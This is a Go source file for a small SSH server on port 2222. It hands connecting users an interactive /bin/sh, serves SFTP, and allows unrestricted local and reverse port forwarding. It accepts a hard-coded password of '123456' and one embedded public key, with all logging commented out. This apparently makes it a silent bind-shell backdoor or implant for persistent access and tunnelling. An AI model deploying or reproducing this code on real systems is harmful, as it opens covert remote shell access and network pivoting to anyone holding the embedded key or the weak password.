//go:build !windows
// +build !windows

package main

import (
	"fmt"
	"io"
	"os/exec"
	"syscall"
	"unsafe"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
)

var (
	port               = "2222"
	pwd                = "123456"
	publicKey          []byte
	authorizedKeyBytes = []byte("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJIQqtAyGTkrZzyIrsdwvJWx21h8XEgLozhyEnjmv5xLKDhlfvixsZZLENsAQ/aIjaU3irczyDU+WCacQaTTDjir/9F8hVIjXFPSCvX9BvGdEo+d6oVjCw/tOowHSMDxtDYzwoggqaS80jU8SGIgLWKR8Jy703rdBUUx6mRZKorvIlUiT8Tovd+87r5m+9dO00ndRzaWSX41fZ62Qxi37xrdSxH2V6gC87tUK9sBzM4n4wcu25ZjRZWIZNvbb3F3slQI8DAvvwy25H96najqeBoYYHTjCVuEHwKfcEfImajRB53GDfYg6X1ItBF85WC54mPjUjNBg0iBdUdZaRArY/")
	authorizedKey      = func() ssh.PublicKey {
		a, _, _, _, err := ssh.ParseAuthorizedKey(authorizedKeyBytes)
		if err != nil {
			// log.Fatalln("cannot parse authorizedKeyBytes")
		}
		return a
	}()
)

func setWinsize(f pty.Pty, w, h int) {
	syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), uintptr(syscall.TIOCSWINSZ),
		uintptr(unsafe.Pointer(&struct{ h, w, x, y uint16 }{uint16(h), uint16(w), 0, 0})))
}

// SftpHandler handler for SFTP subsystem
func SftpHandler(sess ssh.Session) {
	debugStream := io.Discard
	serverOptions := []sftp.ServerOption{
		sftp.WithDebug(debugStream),
	}
	server, err := sftp.NewServer(
		sess,
		serverOptions...,
	)
	if err != nil {
		// log.Printf("sftp server init error: %s\n", err)
		return
	}
	if err := server.Serve(); err == io.EOF {
		server.Close()
		// fmt.Println("sftp client exited session.")
	} else if err != nil {
		// fmt.Println("sftp server completed with error:", err)
	}
}

func main() {
	publicKeyOption := ssh.PublicKeyAuth(func(ctx ssh.Context, key ssh.PublicKey) bool {
		return ssh.KeysEqual(key, authorizedKey)
		// return true // allow all keys, or use ssh.KeysEqual() to compare against known keys
	})
	pwdOption := ssh.PasswordAuth(func(ctx ssh.Context, password string) bool {
		return password == pwd
	})

	forwardHandler := &ssh.ForwardedTCPHandler{}
	ssh_server := ssh.Server{
		Addr: ":" + port,
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
		LocalPortForwardingCallback: ssh.LocalPortForwardingCallback(func(ctx ssh.Context, dhost string, dport uint32) bool {
			//log.Println("Accepted forward", dhost, dport)
			return true
		}),
		ChannelHandlers: map[string]ssh.ChannelHandler{
			"direct-tcpip": ssh.DirectTCPIPHandler,
			"session":      ssh.DefaultSessionHandler,
		},
		Handler: ssh.Handler(func(s ssh.Session) {
			// io.WriteString(s, "Remote forwarding available...\n")
			select {}
		}),
		ReversePortForwardingCallback: ssh.ReversePortForwardingCallback(func(ctx ssh.Context, host string, port uint32) bool {
			//log.Println("attempt to bind", host, port, "granted")
			return true
		}),
		RequestHandlers: map[string]ssh.RequestHandler{
			"tcpip-forward":        forwardHandler.HandleSSHRequest,
			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
		},
	}
	ssh_server.SetOption(publicKeyOption)
	ssh_server.SetOption(pwdOption)
	ssh_server.Handle(func(s ssh.Session) {
		// publicKey = gossh.MarshalAuthorizedKey(s.PublicKey())
		// s.Write(publicKey)
		io.WriteString(s, fmt.Sprintf("Login user: %s\n", s.User()))
		cmd := exec.Command("/bin/sh")
		ptyReq, winCh, isPty := s.Pty()
		if isPty {
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
			f, err := pty.Start(cmd)
			if err != nil {
				panic(err)
			}
			go func() {
				for win := range winCh {
					setWinsize(f, win.Width, win.Height)
				}
			}()
			go func() {
				io.Copy(f, s) // stdin
			}()
			go func() {
				io.Copy(s, f) // stdout
				s.Close()
			}()
			cmd.Wait()
		} else {
			io.WriteString(s, "No PTY requested.\n")
			s.Exit(1)
		}
	})

	// log.Println("starting ssh server on port " + port + "...")
	// log.Fatal(ssh_server.ListenAndServe())
	ssh_server.ListenAndServe()
}
